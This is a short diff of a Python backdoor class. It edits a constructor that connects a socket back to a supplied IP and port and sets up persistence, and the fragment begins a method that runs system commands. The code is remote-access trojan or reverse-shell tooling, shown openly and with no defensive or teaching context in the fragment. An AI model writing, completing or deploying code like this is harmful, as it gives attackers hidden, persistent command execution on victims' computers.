@@ -9,9 +9,10 @@ import platform
 
 class Backdoor:
     def __init__(self, ip, port):
-        self.persistence()
         self.sock_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.sock_obj.connect((ip, port))
+        self.persistence()
+
     def exec_system_cmd(self, command):
         try:
             DEVNULL = open(os.devnull,'wb') 
